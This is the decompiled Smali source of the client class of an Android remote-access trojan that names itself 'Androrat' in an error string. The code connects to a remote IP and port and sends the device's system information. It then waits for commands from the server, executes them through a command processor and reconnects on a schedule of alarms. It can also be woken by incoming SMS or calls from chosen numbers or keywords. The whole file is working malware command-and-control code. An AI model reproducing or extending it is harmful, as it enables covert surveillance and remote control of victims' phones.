.class public Lmy/app/client/Client;
.super Lmy/app/client/ClientListener;
.source "Client.java"

# interfaces
.implements Linout/Controler;


# instance fields
.field public final TAG:Ljava/lang/String;

.field cmd:[B

.field conn:Lout/Connection;

.field elapsedTime:I

.field private handler:Landroid/os/Handler;

.field isListening:Z

.field isRunning:Z

.field nbAttempts:I

.field packet:LPacket/CommandPacket;

.field procCmd:Lmy/app/client/ProcessCommand;

.field readthread:Ljava/lang/Thread;

.field stop:Z


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 50
    invoke-direct {p0}, Lmy/app/client/ClientListener;-><init>()V

    .line 52
    const-class v0, Lmy/app/client/Client;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    .line 55
    const/16 v0, 0xa

    iput v0, p0, Lmy/app/client/Client;->nbAttempts:I

    .line 56
    const/4 v0, 0x1

    iput v0, p0, Lmy/app/client/Client;->elapsedTime:I

    .line 58
    iput-boolean v1, p0, Lmy/app/client/Client;->stop:Z

    .line 60
    iput-boolean v1, p0, Lmy/app/client/Client;->isRunning:Z

    .line 61
    iput-boolean v1, p0, Lmy/app/client/Client;->isListening:Z

    .line 68
    new-instance v0, Lmy/app/client/Client$1;

    invoke-direct {v0, p0}, Lmy/app/client/Client$1;-><init>(Lmy/app/client/Client;)V

    iput-object v0, p0, Lmy/app/client/Client;->handler:Landroid/os/Handler;

    .line 50
    return-void
.end method


# virtual methods
.method public Storage(LPacket/TransportPacket;Ljava/lang/String;)V
    .locals 5
    .parameter "p"
    .parameter "i"

    .prologue
    .line 295
    :try_start_0
    new-instance v3, LPacket/CommandPacket;

    invoke-direct {v3}, LPacket/CommandPacket;-><init>()V

    iput-object v3, p0, Lmy/app/client/Client;->packet:LPacket/CommandPacket;

    .line 296
    iget-object v3, p0, Lmy/app/client/Client;->packet:LPacket/CommandPacket;

    invoke-virtual {p1}, LPacket/TransportPacket;->getData()[B

    move-result-object v4

    invoke-virtual {v3, v4}, LPacket/CommandPacket;->parse([B)V

    .line 298
    new-instance v2, Landroid/os/Message;

    invoke-direct {v2}, Landroid/os/Message;-><init>()V

    .line 299
    .local v2, mess:Landroid/os/Message;
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 300
    .local v0, b:Landroid/os/Bundle;
    const-string v3, "command"

    iget-object v4, p0, Lmy/app/client/Client;->packet:LPacket/CommandPacket;

    invoke-virtual {v4}, LPacket/CommandPacket;->getCommand()S

    move-result v4

    invoke-virtual {v0, v3, v4}, Landroid/os/Bundle;->putShort(Ljava/lang/String;S)V

    .line 301
    const-string v3, "arguments"

    iget-object v4, p0, Lmy/app/client/Client;->packet:LPacket/CommandPacket;

    invoke-virtual {v4}, LPacket/CommandPacket;->getArguments()[B

    move-result-object v4

    invoke-virtual {v0, v3, v4}, Landroid/os/Bundle;->putByteArray(Ljava/lang/String;[B)V

    .line 302
    const-string v3, "chan"

    iget-object v4, p0, Lmy/app/client/Client;->packet:LPacket/CommandPacket;

    invoke-virtual {v4}, LPacket/CommandPacket;->getTargetChannel()I

    move-result v4

    invoke-virtual {v0, v3, v4}, Landroid/os/Bundle;->putInt(Ljava/lang/String;I)V

    .line 303
    invoke-virtual {v2, v0}, Landroid/os/Message;->setData(Landroid/os/Bundle;)V

    .line 304
    iget-object v3, p0, Lmy/app/client/Client;->handler:Landroid/os/Handler;

    invoke-virtual {v3, v2}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 310
    .end local v0           #b:Landroid/os/Bundle;
    .end local v2           #mess:Landroid/os/Message;
    :goto_0
    return-void

    .line 306
    :catch_0
    move-exception v1

    .line 308
    .local v1, e:Ljava/lang/Exception;
    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v4, "Androrat.Client.storage : pas une commande"

    invoke-virtual {v3, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public handleData(I[B)V
    .locals 1
    .parameter "channel"
    .parameter "data"

    .prologue
    .line 261
    iget-object v0, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    invoke-virtual {v0, p1, p2}, Lout/Connection;->sendData(I[B)V

    .line 262
    return-void
.end method

.method public loadPreferences()V
    .locals 2

    .prologue
    .line 243
    iget-object v1, p0, Lmy/app/client/Client;->procCmd:Lmy/app/client/ProcessCommand;

    invoke-virtual {v1}, Lmy/app/client/ProcessCommand;->loadPreferences()LPacket/PreferencePacket;

    move-result-object v0

    .line 244
    .local v0, p:LPacket/PreferencePacket;
    invoke-virtual {v0}, LPacket/PreferencePacket;->isWaitTrigger()Z

    move-result v1

    iput-boolean v1, p0, Lmy/app/client/Client;->waitTrigger:Z

    .line 245
    invoke-virtual {v0}, LPacket/PreferencePacket;->getIp()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lmy/app/client/Client;->ip:Ljava/lang/String;

    .line 246
    invoke-virtual {v0}, LPacket/PreferencePacket;->getPort()I

    move-result v1

    iput v1, p0, Lmy/app/client/Client;->port:I

    .line 247
    invoke-virtual {v0}, LPacket/PreferencePacket;->getPhoneNumberCall()Ljava/util/ArrayList;

    move-result-object v1

    iput-object v1, p0, Lmy/app/client/Client;->authorizedNumbersCall:Ljava/util/ArrayList;

    .line 248
    invoke-virtual {v0}, LPacket/PreferencePacket;->getPhoneNumberSMS()Ljava/util/ArrayList;

    move-result-object v1

    iput-object v1, p0, Lmy/app/client/Client;->authorizedNumbersSMS:Ljava/util/ArrayList;

    .line 249
    invoke-virtual {v0}, LPacket/PreferencePacket;->getKeywordSMS()Ljava/util/ArrayList;

    move-result-object v1

    iput-object v1, p0, Lmy/app/client/Client;->authorizedNumbersKeywords:Ljava/util/ArrayList;

    .line 250
    return-void
.end method

.method public onCreate()V
    .locals 2

    .prologue
    .line 79
    iget-object v0, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    const-string v1, "In onCreate"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 80
    new-instance v0, Lmy/app/Library/SystemInfo;

    invoke-direct {v0, p0}, Lmy/app/Library/SystemInfo;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lmy/app/client/Client;->infos:Lmy/app/Library/SystemInfo;

    .line 81
    new-instance v0, Lmy/app/client/ProcessCommand;

    invoke-direct {v0, p0}, Lmy/app/client/ProcessCommand;-><init>(Lmy/app/client/ClientListener;)V

    iput-object v0, p0, Lmy/app/client/Client;->procCmd:Lmy/app/client/ProcessCommand;

    .line 83
    invoke-virtual {p0}, Lmy/app/client/Client;->loadPreferences()V

    .line 84
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 269
    iget-object v0, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    const-string v1, "in onDestroy"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 270
    iget-object v0, p0, Lmy/app/client/Client;->ConnectivityCheckReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lmy/app/client/Client;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 271
    iget-object v0, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    invoke-virtual {v0}, Lout/Connection;->stop()V

    .line 272
    const/4 v0, 0x1

    iput-boolean v0, p0, Lmy/app/client/Client;->stop:Z

    .line 273
    invoke-virtual {p0}, Lmy/app/client/Client;->stopSelf()V

    .line 274
    invoke-super {p0}, Lmy/app/client/ClientListener;->onDestroy()V

    .line 275
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 9
    .parameter "intent"
    .parameter "flags"
    .parameter "startId"

    .prologue
    const/4 v8, 0x2

    const/4 v7, 0x1

    const/4 v6, 0x0

    .line 91
    if-nez p1, :cond_1

    .line 166
    :cond_0
    :goto_0
    return v7

    .line 93
    :cond_1
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    .line 94
    .local v2, who:Ljava/lang/String;
    iget-object v3, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "onStartCommand by: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 96
    const-string v3, "IP"

    invoke-virtual {p1, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 97
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v3

    const-string v4, "IP"

    invoke-virtual {v3, v4}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lmy/app/client/Client;->ip:Ljava/lang/String;

    .line 98
    :cond_2
    const-string v3, "PORT"

    invoke-virtual {p1, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 99
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v3

    const-string v4, "PORT"

    invoke-virtual {v3, v4}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v3

    iput v3, p0, Lmy/app/client/Client;->port:I

    .line 101
    :cond_3
    iget-boolean v3, p0, Lmy/app/client/Client;->isRunning:Z

    if-nez v3, :cond_7

    .line 104
    new-instance v0, Landroid/content/IntentFilter;

    const-string v3, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-direct {v0, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 105
    .local v0, filterc:Landroid/content/IntentFilter;
    iget-object v3, p0, Lmy/app/client/Client;->ConnectivityCheckReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v3, v0}, Lmy/app/client/Client;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 106
    iput-boolean v7, p0, Lmy/app/client/Client;->isRunning:Z

    .line 107
    new-instance v3, Lout/Connection;

    iget-object v4, p0, Lmy/app/client/Client;->ip:Ljava/lang/String;

    iget v5, p0, Lmy/app/client/Client;->port:I

    invoke-direct {v3, v4, v5, p0}, Lout/Connection;-><init>(Ljava/lang/String;ILinout/Controler;)V

    iput-object v3, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    .line 109
    iget-boolean v3, p0, Lmy/app/client/Client;->waitTrigger:Z

    if-eqz v3, :cond_4

    .line 111
    invoke-virtual {p0}, Lmy/app/client/Client;->registerSMSAndCall()V

    goto :goto_0

    .line 114
    :cond_4
    iget-object v3, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Try to connect to "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lmy/app/client/Client;->ip:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ":"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget v5, p0, Lmy/app/client/Client;->port:I

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 115
    iget-object v3, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    invoke-virtual {v3}, Lout/Connection;->connect()Z

    move-result v3

    if-eqz v3, :cond_5

    .line 116
    new-instance v3, LPacket/CommandPacket;

    invoke-direct {v3}, LPacket/CommandPacket;-><init>()V

    iput-object v3, p0, Lmy/app/client/Client;->packet:LPacket/CommandPacket;

    .line 117
    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lmy/app/client/Client$2;

    invoke-direct {v4, p0}, Lmy/app/client/Client$2;-><init>(Lmy/app/client/Client;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v3, p0, Lmy/app/client/Client;->readthread:Ljava/lang/Thread;

    .line 118
    iget-object v3, p0, Lmy/app/client/Client;->readthread:Ljava/lang/Thread;

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 119
    new-instance v1, LPacket/CommandPacket;

    iget-object v3, p0, Lmy/app/client/Client;->infos:Lmy/app/Library/SystemInfo;

    invoke-virtual {v3}, Lmy/app/Library/SystemInfo;->getBasicInfos()[B

    move-result-object v3

    invoke-direct {v1, v8, v6, v3}, LPacket/CommandPacket;-><init>(SI[B)V

    .line 120
    .local v1, pack:LPacket/CommandPacket;
    invoke-virtual {v1}, LPacket/CommandPacket;->build()[B

    move-result-object v3

    invoke-virtual {p0, v6, v3}, Lmy/app/client/Client;->handleData(I[B)V

    .line 122
    iput-boolean v7, p0, Lmy/app/client/Client;->isListening:Z

    .line 123
    iget-boolean v3, p0, Lmy/app/client/Client;->waitTrigger:Z

    if-eqz v3, :cond_0

    .line 124
    iget-object v3, p0, Lmy/app/client/Client;->SMSreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v3}, Lmy/app/client/Client;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 125
    iget-object v3, p0, Lmy/app/client/Client;->Callreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v3}, Lmy/app/client/Client;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 126
    iput-boolean v6, p0, Lmy/app/client/Client;->waitTrigger:Z

    goto/16 :goto_0

    .line 130
    .end local v1           #pack:LPacket/CommandPacket;
    :cond_5
    iget-boolean v3, p0, Lmy/app/client/Client;->isConnected:Z

    if-eqz v3, :cond_6

    .line 131
    invoke-virtual {p0}, Lmy/app/client/Client;->resetConnectionAttempts()V

    .line 132
    invoke-virtual {p0}, Lmy/app/client/Client;->reconnectionAttempts()V

    goto/16 :goto_0

    .line 135
    :cond_6
    iget-object v3, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    const-string v4, "Not Connected wait a Network update"

    invoke-static {v3, v4}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 141
    .end local v0           #filterc:Landroid/content/IntentFilter;
    :cond_7
    iget-boolean v3, p0, Lmy/app/client/Client;->isListening:Z

    if-eqz v3, :cond_8

    .line 142
    iget-object v3, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Called uselessly by: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, " (already listening)"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 147
    :cond_8
    iget-object v3, p0, Lmy/app/client/Client;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Connection by : "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 148
    iget-object v3, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    invoke-virtual {v3}, Lout/Connection;->connect()Z

    move-result v3

    if-eqz v3, :cond_9

    .line 149
    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lmy/app/client/Client$3;

    invoke-direct {v4, p0}, Lmy/app/client/Client$3;-><init>(Lmy/app/client/Client;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v3, p0, Lmy/app/client/Client;->readthread:Ljava/lang/Thread;

    .line 150
    iget-object v3, p0, Lmy/app/client/Client;->readthread:Ljava/lang/Thread;

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 151
    new-instance v1, LPacket/CommandPacket;

    iget-object v3, p0, Lmy/app/client/Client;->infos:Lmy/app/Library/SystemInfo;

    invoke-virtual {v3}, Lmy/app/Library/SystemInfo;->getBasicInfos()[B

    move-result-object v3

    invoke-direct {v1, v8, v6, v3}, LPacket/CommandPacket;-><init>(SI[B)V

    .line 152
    .restart local v1       #pack:LPacket/CommandPacket;
    invoke-virtual {v1}, LPacket/CommandPacket;->build()[B

    move-result-object v3

    invoke-virtual {p0, v6, v3}, Lmy/app/client/Client;->handleData(I[B)V

    .line 153
    iput-boolean v7, p0, Lmy/app/client/Client;->isListening:Z

    .line 154
    iget-boolean v3, p0, Lmy/app/client/Client;->waitTrigger:Z

    if-eqz v3, :cond_0

    .line 155
    iget-object v3, p0, Lmy/app/client/Client;->SMSreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v3}, Lmy/app/client/Client;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 156
    iget-object v3, p0, Lmy/app/client/Client;->Callreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v3}, Lmy/app/client/Client;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 157
    iput-boolean v6, p0, Lmy/app/client/Client;->waitTrigger:Z

    goto/16 :goto_0

    .line 161
    .end local v1           #pack:LPacket/CommandPacket;
    :cond_9
    invoke-virtual {p0}, Lmy/app/client/Client;->reconnectionAttempts()V

    goto/16 :goto_0
.end method

.method public processCommand(Landroid/os/Bundle;)V
    .locals 5
    .parameter "b"

    .prologue
    .line 192
    :try_start_0
    iget-object v1, p0, Lmy/app/client/Client;->procCmd:Lmy/app/client/ProcessCommand;

    const-string v2, "command"

    invoke-virtual {p1, v2}, Landroid/os/Bundle;->getShort(Ljava/lang/String;)S

    move-result v2

    const-string v3, "arguments"

    invoke-virtual {p1, v3}, Landroid/os/Bundle;->getByteArray(Ljava/lang/String;)[B

    move-result-object v3

    const-string v4, "chan"

    invoke-virtual {p1, v4}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v1, v2, v3, v4}, Lmy/app/client/ProcessCommand;->process(S[BI)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 197
    :goto_0
    return-void

    .line 194
    :catch_0
    move-exception v0

    .line 195
    .local v0, e:Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Error on Client:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lmy/app/client/Client;->sendError(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public reconnectionAttempts()V
    .locals 7

    .prologue
    const/4 v6, 0x0

    .line 207
    iget-boolean v4, p0, Lmy/app/client/Client;->isConnected:Z

    if-nez v4, :cond_0

    .line 240
    :goto_0
    :sswitch_0
    return-void

    .line 210
    :cond_0
    iget v4, p0, Lmy/app/client/Client;->nbAttempts:I

    if-nez v4, :cond_1

    .line 211
    iget v4, p0, Lmy/app/client/Client;->elapsedTime:I

    sparse-switch v4, :sswitch_data_0

    .line 226
    :cond_1
    :goto_1
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    .line 227
    .local v1, cal:Ljava/util/Calendar;
    const/16 v4, 0xc

    iget v5, p0, Lmy/app/client/Client;->elapsedTime:I

    invoke-virtual {v1, v4, v5}, Ljava/util/Calendar;->add(II)V

    .line 229
    new-instance v2, Landroid/content/Intent;

    const-class v4, Lmy/app/client/AlarmListener;

    invoke-direct {v2, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 231
    .local v2, intent:Landroid/content/Intent;
    const-string v4, "alarm_message"

    const-string v5, "Wake up Dude !"

    invoke-virtual {v2, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 233
    const/high16 v4, 0x800

    invoke-static {p0, v6, v2, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 235
    .local v3, sender:Landroid/app/PendingIntent;
    const-string v4, "alarm"

    invoke-virtual {p0, v4}, Lmy/app/client/Client;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 236
    .local v0, am:Landroid/app/AlarmManager;
    invoke-virtual {v1}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 239
    iget v4, p0, Lmy/app/client/Client;->nbAttempts:I

    add-int/lit8 v4, v4, -0x1

    iput v4, p0, Lmy/app/client/Client;->nbAttempts:I

    goto :goto_0

    .line 213
    .end local v0           #am:Landroid/app/AlarmManager;
    .end local v1           #cal:Ljava/util/Calendar;
    .end local v2           #intent:Landroid/content/Intent;
    .end local v3           #sender:Landroid/app/PendingIntent;
    :sswitch_1
    const/4 v4, 0x5

    iput v4, p0, Lmy/app/client/Client;->elapsedTime:I

    goto :goto_1

    .line 216
    :sswitch_2
    const/16 v4, 0xa

    iput v4, p0, Lmy/app/client/Client;->elapsedTime:I

    goto :goto_1

    .line 219
    :sswitch_3
    const/16 v4, 0x1e

    iput v4, p0, Lmy/app/client/Client;->elapsedTime:I

    goto :goto_1

    .line 211
    :sswitch_data_0
    .sparse-switch
        0x1 -> :sswitch_1
        0x5 -> :sswitch_2
        0xa -> :sswitch_3
        0x1e -> :sswitch_0
    .end sparse-switch
.end method

.method public registerSMSAndCall()V
    .locals 3

    .prologue
    .line 283
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 284
    .local v0, filter:Landroid/content/IntentFilter;
    const-string v2, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 285
    iget-object v2, p0, Lmy/app/client/Client;->SMSreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v2, v0}, Lmy/app/client/Client;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 286
    new-instance v1, Landroid/content/IntentFilter;

    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V

    .line 287
    .local v1, filter2:Landroid/content/IntentFilter;
    const-string v2, "android.intent.action.PHONE_STATE"

    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 288
    iget-object v2, p0, Lmy/app/client/Client;->Callreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v2, v1}, Lmy/app/client/Client;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 289
    return-void
.end method

.method public resetConnectionAttempts()V
    .locals 1

    .prologue
    .line 278
    const/16 v0, 0xa

    iput v0, p0, Lmy/app/client/Client;->nbAttempts:I

    .line 279
    const/4 v0, 0x1

    iput v0, p0, Lmy/app/client/Client;->elapsedTime:I

    .line 280
    return-void
.end method

.method public sendError(Ljava/lang/String;)V
    .locals 5
    .parameter "error"

    .prologue
    const/4 v4, 0x1

    .line 257
    iget-object v0, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    new-instance v1, LPacket/LogPacket;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-direct {v1, v2, v3, v4, p1}, LPacket/LogPacket;-><init>(JBLjava/lang/String;)V

    invoke-virtual {v1}, LPacket/LogPacket;->build()[B

    move-result-object v1

    invoke-virtual {v0, v4, v1}, Lout/Connection;->sendData(I[B)V

    .line 258
    return-void
.end method

.method public sendInformation(Ljava/lang/String;)V
    .locals 6
    .parameter "infos"

    .prologue
    .line 253
    iget-object v0, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    const/4 v1, 0x1

    new-instance v2, LPacket/LogPacket;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    const/4 v5, 0x0

    invoke-direct {v2, v3, v4, v5, p1}, LPacket/LogPacket;-><init>(JBLjava/lang/String;)V

    invoke-virtual {v2}, LPacket/LogPacket;->build()[B

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lout/Connection;->sendData(I[B)V

    .line 254
    return-void
.end method

.method public waitInstruction()V
    .locals 2

    .prologue
    .line 174
    :goto_0
    :try_start_0
    iget-boolean v1, p0, Lmy/app/client/Client;->stop:Z

    if-eqz v1, :cond_1

    .line 187
    :cond_0
    :goto_1
    return-void

    .line 176
    :cond_1
    iget-object v1, p0, Lmy/app/client/Client;->conn:Lout/Connection;

    invoke-virtual {v1}, Lout/Connection;->getInstruction()Ljava/nio/ByteBuffer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 179
    :catch_0
    move-exception v0

    .line 180
    .local v0, e:Ljava/lang/Exception;
    const/4 v1, 0x0

    iput-boolean v1, p0, Lmy/app/client/Client;->isListening:Z

    .line 181
    invoke-virtual {p0}, Lmy/app/client/Client;->resetConnectionAttempts()V

    .line 182
    invoke-virtual {p0}, Lmy/app/client/Client;->reconnectionAttempts()V

    .line 183
    iget-boolean v1, p0, Lmy/app/client/Client;->waitTrigger:Z

    if-eqz v1, :cond_0

    .line 184
    invoke-virtual {p0}, Lmy/app/client/Client;->registerSMSAndCall()V

    goto :goto_1
.end method
